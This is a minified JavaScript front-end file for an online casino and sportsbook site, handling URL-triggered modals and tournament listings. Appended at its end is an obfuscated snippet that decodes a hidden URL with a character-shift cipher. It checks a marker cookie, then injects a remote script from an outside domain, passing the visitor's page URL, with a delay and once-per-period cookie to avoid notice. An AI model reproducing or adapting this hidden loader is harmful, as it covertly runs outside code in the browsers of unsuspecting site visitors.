        t && (t = decodeURI(t.split("&")[0].split("#")[0])), openSlots(t)
    }
    if (e && -1 != window.location.href.indexOf("?partner") && !modalOpen && (modalOpen = 0, e = 0, openPartner()), e && -1 != window.location.href.indexOf("?challenges") && !modalOpen && (modalOpen = 0, e = 0, openChal()), e && -1 != window.location.href.indexOf("?bonuses") && !modalOpen && (modalOpen = 0, e = 0, openBonuses()), e && -1 != window.location.href.indexOf("?about_bons") && !modalOpen && (modalOpen = 0, e = 0, openBonuses(3)), e && -1 != window.location.href.indexOf("?promo") && !modalOpen) {
        modalOpen = 0, e = 0;
        let t = window.location.href.split("?promo=")[1];
        t && (t = t.split("&")[0]), asyFunc(openPromo, openPromDets, t)
    }
    if (e && -1 != window.location.href.indexOf("?vipclub") && !modalOpen && (modalOpen = 0, e = 0, openVipClub()), e && -1 != window.location.href.indexOf("?toursFS") && !modalOpen && (modalOpen = 0, e = 0, openTours("fs")), e && -1 != window.location.href.indexOf("?toursFree") && !modalOpen && (modalOpen = 0, e = 0, openTours("candy")), e && -1 != window.location.href.indexOf("?tours") && !modalOpen && (modalOpen = 0, e = 0, openTours()), e && -1 != window.location.href.indexOf("?freebox") && !modalOpen && (modalOpen = 0, e = 0, openBox()), e && -1 != window.location.href.indexOf("?sport_rules") && !modalOpen && (modalOpen = 0, e = 0, opensport_rules()), e && -1 != window.location.href.indexOf("?game=") && !modalOpen && (modalOpen = 0, e = 0, openGame(window.location.href.split("?game=")[1].split("&")[0].split("#")[0])), e && -1 != window.location.href.indexOf("?gamelink=") && !modalOpen) {
        let t = window.location.href.split("?gamelink=")[1].split("&")[0].split("#")[0];
        try {
            t = window.atob(t), openBannerG(t), modalOpen = 0, e = 0, isMobile() && (e = 1)
        } catch (e) {}
    }
    if (e && -1 != window.location.href.indexOf("/sbet/") && !modalOpen && (modalOpen = 0, e = 0, sportTG(2), openSport(1, 1)), 1 == startPageSt && e && -1 != window.location.href.indexOf("/blog/") && !modalOpen && window.location.href != previousUrlGame) {
        modalOpen = 0, e = 0;
        let t = window.location.href.split("/blog/")[1],
            s = t.split("/");
        t = "/" + t, -1 != t.indexOf("/category/") ? null != s[2] ? blogGet(!1, s[1], "", s[2], "", "en", "pagination") : blogGet(!1, s[1], "", 1, "", "en", "category") : null == s[1] ? blogGet(!1, "all", "", 1, "", "en", "category") : blogGet(!1, "", s[1], 1, "", "en", "blog")
    }
    return e && -1 != window.location.href.indexOf("/bbet/") && !modalOpen && (modalOpen = 0, e = 0, sportTG(2), openSport(1)), e && 0 == isBlog && openHome(), -1 != window.location.href.indexOf("&signup") && (1 != window.user_il ? (modalOpen = 1, openSign()) : closeHistory("&signup")), -1 != window.location.href.indexOf("=buyCrypto") ? (modalOpen = 1, void asyFunc(openDeposite, openDepSLot, "buyCrypto")) : -1 != window.location.href.indexOf("=PrivacyPolicy") ? (modalOpen = 1, void asyFunc(openRoules, openSlotRoules, "PolicyMy")) : -1 != window.location.href.indexOf("=TermsOfService") ? (modalOpen = 1, void asyFunc(openRoules, openSlotRoules, "Terms")) : -1 != window.location.href.indexOf("&deposite") ? (modalOpen = 1, void asyFunc(openDeposite, openDepSLot, "deposit")) : (-1 != window.location.href.indexOf("&transactions") && (modalOpen = 1, asyFunc(openTrans, openTransSLot, "deposit")), -1 != window.location.href.indexOf("&profile") && (modalOpen = 1, openProfile()), -1 != window.location.href.indexOf("&getPrize") && (modalOpen = 1, openGetPrize()), -1 != window.location.href.indexOf("&rakeback") && (modalOpen = 1, openRakeback()), -1 != window.location.href.indexOf("&statistics") && (modalOpen = 1, openStatic()), -1 != window.location.href.indexOf("&sportbets") && (modalOpen = 1, openSportBets()), -1 != window.location.href.indexOf("&bonusJet") && (modalOpen = 1, openBonus()), -1 != window.location.href.indexOf("=Security") ? (modalOpen = 1, void asyFunc(openSettings, openSlotSettings, "Security")) : -1 != window.location.href.indexOf("&settings") ? (modalOpen = 1, void openSettings()) : -1 != window.location.href.indexOf("&tasks") ? (modalOpen = 1, void openTasks()) : (-1 != window.location.href.indexOf("&bonusWheel") && (modalOpen = 1, openWheel()), -1 != window.location.href.indexOf("&forgot-password") && (modalOpen = 1, openForgot()), -1 != window.location.href.indexOf("&timeSelfExclusion") && (modalOpen = 1, askSelfEx()), -1 != window.location.href.indexOf("&verify_representative") && (modalOpen = 1, openVerRep()), -1 != window.location.href.indexOf("&help-center") && (modalOpen = 1, openHelp()), -1 != window.location.href.indexOf("&coins_search") && (modalOpen = 1, openSearch()), -1 != window.location.href.indexOf("&help-center") && (modalOpen = 1, openHelp()), -1 != window.location.href.indexOf("&signin") && (1 != window.user_il ? (modalOpen = 1, openMobileLogin()) : closeHistory("&signin")), -1 != window.location.href.indexOf("&sign2FA") && (modalOpen = 1, openMobileLogin(1)), -1 != window.location.href.indexOf("&payment") && (modalOpen = 1, openPayment()), void(-1 != window.location.href.indexOf("&rules") && (modalOpen = 1, openRoules()))))
}, getNewTours = async e => {
    let t;
    t = -1 != ["en", "pt", "ru"].findIndex((e => e == lngGame)) ? lngGame.toUpperCase() : "EN";
    let s = encodeURIComponent("*[lng == '" + t + "'&&_type=='list']"),
        a = await axios.get(`https://qd4ujjl1.api.sanity.io/v2021-10-21/data/query/production?query=${s}`).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
    a = a.data.result[0];
    let n = "";
    if (a.tours && (1 == e && (a.tours.slice(0, 3).forEach(((e, t) => {
            n += "<div onclick=\"asyFunc(openPromo,openPromDets,'" + a.keyL[t] + '\')" class="liTor3"><img loading="lazy" src="/assets/image/iconsMenu/cupa.svg" alt="Icon"><span>' + e + "</span></div>"
        })), Array.from(gC("tours_menu_wr")).forEach((e => e.innerHTML = n))), 2 == e)) {
        let e = "https://cdn.sanity.io/images/qd4ujjl1/production/";
        a.tours.forEach(((t, s) => {
            let r = `${e}${a.refL[s].asset._ref.replace("image-","").replace("-png","")}.png 1x,${e}${a.refLB[s].asset._ref.replace("image-","").replace("-png","")}.png 2x`;
            n += `<div onclick="openPromDets('${a.keyL[s]}')" class="actsi_to">\n        <img srcset="${r}" alt="T" class="actsi_i">\n        <div class="actsi_fl">\n            <div class="actsi_text">\n                <div class="actsi_tit">${t}</div>\n            </div>\n        <button class="ui-button btn_green flex button-normal s-gray"><div class="button-inner">Details</div></button>\n        </div>\n        </div>`
        })), gC("actsi_grt")[0].innerHTML += n
    }
};
window.addEventListener("popstate", (() => {
    checkPage()
}));
// let startPageSt = 0;
// (async () => {
//     if (await checkUser(), document.getElementById("coins_preload").style.display = "none", await getSlots(), addSearchGames(filterFirstGame(json_all_first.originals), "top1"), addSearchGames(filterFirstGame(json_all_first.top), "top2"), addSearchGames(filterFirstGame(json_all_first.fortune), "for2"), addSearchGames(filterFirstGame(json_all_first.hit), "hit"), addSearchGames(filterFirstGame(json_all_first.rek_live), "rek_live"), addSearchGames(filterFirstGame(json_all_first.cold24), "cold24"), addSearchGames(filterFirstGame(json_all_first.hot24), "hot24"), addSearchGames(filterFirstGame(json_all_first.scratchCards), "casual"), document.cookie = `currentUrl=${window.location.href}; max-age=31536000; path=/`, vipLevels = JSON.parse(vipLevels), vipLevels = Object.entries(vipLevels), document.getElementById("coins_preloadOpen").style.display = "none", checkPage(), startPageSt = 1, getNewTours(1), null == getCookieChat("aCookie")) {
//         let e = document.getElementById("cok_pop45");
//         e && (e.style.display = "flex"), setTimeout((() => {
//             closePopup123()
//         }), 5e3)
//     }
//     let e, t;
//     json_all_first.originals.forEach((s => {
//         e = s[1].s, "hilo" == e && (e = "hi_lo"), t = gC(e + "_fast1")[0], t && (t.parentNode.style.display = "block"), t = gC(e + "_fast2")[0], t && (t.style.display = "block")
//     }))
// })();
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));